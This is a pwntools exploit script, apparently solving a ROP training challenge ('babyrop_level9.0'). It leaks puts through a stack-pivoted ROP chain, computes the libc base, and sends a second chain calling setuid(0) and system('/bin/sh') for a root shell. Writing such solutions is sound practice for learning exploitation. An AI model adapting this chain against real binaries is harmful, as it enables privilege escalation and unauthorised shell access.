from pwn import *
import sys

context.log_level = 'debug'
context.binary = exe = ELF('./babyrop_level9.0', checksec=False)
libc = exe.libc


if len(sys.argv) == 2:   
    r = process(exe.path)
    gdb.attach(r, gdbscript="""
               b *main
               b *challenge+281
               b *challenge+481
               """)
else:
    r = process(exe.path)

rop1 = ROP(exe)


puts_got = exe.got['puts']
_start = exe.sym['_start']

leave_ret = 0x00000000004016ab
poprbp_ret = 0x000000000040129d
start_input = 0x4140e0


rop1.puts(puts_got)
rop1.raw(p64(_start))
log.info("Dump ropchain: " + rop1.dump())


payload_pivot = p64(poprbp_ret)
payload_pivot += p64(start_input + 16)
payload_pivot += p64(leave_ret)
payload_pivot += rop1.chain()

log.info("The address of _start: " + hex(_start))
r.send(payload_pivot)
r.recvuntil(b'Leaving!\n')
#puts_got_addr = int.from_bytes(r.recvn(8), 'little')
puts_got_addr = u64(r.recvn(6) + b'\x00\x00')
log.info("The address of puts_got: " + hex(puts_got_addr))
libc.address = puts_got_addr - libc.sym['puts']

binsh = next(libc.search(b'/bin/sh\x00'))
log.info("The address of \"/bin/sh\": " + hex(binsh))


rop2 = ROP(libc)
rop2.setuid(0)
rop2.system(binsh)
log.info("Dump ropchain: " + rop2.dump())


payload = p64(poprbp_ret)
payload += p64(start_input + 16)
payload += p64(leave_ret)
payload += rop2.chain()


r.send(payload)
r.interactive()